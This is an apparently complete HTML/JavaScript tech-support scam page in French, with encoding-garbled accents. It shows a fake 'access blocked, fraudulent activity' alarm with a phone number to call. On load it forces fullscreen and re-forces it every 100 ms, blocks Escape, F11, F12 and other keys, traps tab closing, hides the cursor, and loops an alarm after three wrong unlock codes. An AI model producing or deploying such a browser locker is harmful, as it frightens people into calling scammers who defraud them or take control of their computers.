<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîí S√©curit√© Syst√®me</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        html, body {
            width: 100%;
            height: 100%;
            background: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
            cursor: none; /* Cache le curseur */
        }

        .container {
            background: red;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px white;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        #alert-message {
            font-size: 16px;
            margin-bottom: 20px;
        }

        input {
            padding: 10px;
            font-size: 16px;
            margin-bottom: 10px;
            text-align: center;
            outline: none;
        }

        button {
            background: black;
            color: white;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }

        #error-message {
            color: yellow;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body onload="startLockdown()">
    <div class="container">
        <h1>üî¥ ACC√àS BLOQU√â üî¥</h1>
        <p id="alert-message">
            üö® <b>SUSPICION D‚ÄôACTIVIT√â FRAUDULEUSE</b> üö®<br>
            Votre ordinateur est verrouill√© pour des raisons de **s√©curit√©**.<br>
            Veuillez **entrer le code secret** pour d√©verrouiller.<br>
            <b>‚òé Assistance : +44 741 30 52 610</b>
        </p>
        <input type="password" id="codeInput" placeholder="Entrez le code secret..." autofocus>
        <button onclick="checkCode()">D√©verrouiller</button>
        <p id="error-message"></p>
    </div>

    <script>
        // üîí Codes secrets autoris√©s
        const SECRET_CODES = ["dakar", "2012", "1234"];
        let attempts = 0;
        const maxAttempts = 3;

        // üöÄ D√©marrer le verrouillage
        function startLockdown() {
            requestFullScreen();  // Forcer le mode plein √©cran
            blockKeys();          // D√©sactiver certaines touches sauf le pav√© num√©rique et Entr√©e
            preventClose();       // Emp√™cher la fermeture de l'onglet
            lockMouse();          // Bloquer la souris en haut √† droite
            setTimeout(() => {
                document.getElementById("codeInput").focus(); // üìå Focus automatique sur le champ de saisie
            }, 500);
        }

        // üîê V√©rifier le code
        function checkCode() {
            let inputCode = document.getElementById("codeInput").value.toLowerCase();
            
            if (SECRET_CODES.includes(inputCode)) {
                unlockSystem();
            } else {
                attempts++;
                document.getElementById("error-message").textContent = `‚õî Code incorrect (${attempts}/${maxAttempts})`;
                
                if (attempts >= maxAttempts) {
                    playAlarm();
                }
            }
        }

        // üõë Forcer le plein √©cran et emp√™cher la sortie
        function requestFullScreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) { // Firefox
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { // IE / Edge
                elem.msRequestFullscreen();
            }
        }

        // üö® Bloquer toutes les touches sp√©ciales sauf "Entr√©e" et le pav√© num√©rique
        function blockKeys() {
            document.addEventListener("keydown", function (event) {
                let blockedKeys = [
                    "Escape", "F11", "F5", "F12", "Tab", "Control", "Alt", "Meta",
                    "Shift", "Delete", "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"
                ];

                let allowedKeys = [
                    "Enter", "Numpad0", "Numpad1", "Numpad2", "Numpad3", "Numpad4", 
                    "Numpad5", "Numpad6", "Numpad7", "Numpad8", "Numpad9"
                ];
                
                if (blockedKeys.includes(event.key)) {
                    event.preventDefault();
                }

                // Si l'utilisateur appuie sur "Entr√©e", valider le code
                if (event.key === "Enter") {
                    checkCode();
                }
            });
        }

        // üîä Jouer une alarme apr√®s 3 erreurs
        function playAlarm() {
            let audio = new Audio("https://freesound.org/data/previews/411/411091_5121236-lq.mp3");
            audio.loop = true;
            audio.play();
        }

        // üîì D√©verrouiller l'√©cran
        function unlockSystem() {
            document.exitFullscreen();
            document.body.innerHTML = "<h1 style='color: green;'>‚úÖ Acc√®s R√©tabli</h1>";
        }

        // ‚ùå Emp√™cher la fermeture de l'onglet et remettre en plein √©cran rapidement
        function preventClose() {
            window.onbeforeunload = function() {
                return "üö® Attention ! Cette action peut provoquer une perte de donn√©es.";
            };

            document.addEventListener("visibilitychange", function() {
                if (document.hidden) {
                    setTimeout(requestFullScreen, 10); // üìå Retour en plein √©cran imm√©diat
                }
            });

            setInterval(() => {
                if (!document.fullscreenElement) {
                    requestFullScreen(); // üìå Re-forcer le plein √©cran en cas de tentative de sortie
                }
            }, 100);
        }

        // üñ±Ô∏è Bloquer la souris en haut √† droite
        function lockMouse() {
            document.addEventListener("mousemove", function(event) {
                event.preventDefault();
                window.scrollTo(0, 0); // Emp√™che le d√©filement
                
                let fakeCursor = document.createElement("div");
                fakeCursor.style.position = "fixed";
                fakeCursor.style.top = "0px";
                fakeCursor.style.right = "0px";
                fakeCursor.style.width = "10px";
                fakeCursor.style.height = "10px";
                fakeCursor.style.zIndex = "9999";
                fakeCursor.style.background = "transparent";
                document.body.appendChild(fakeCursor);
            });
        }
    </script>
</body>
</html>
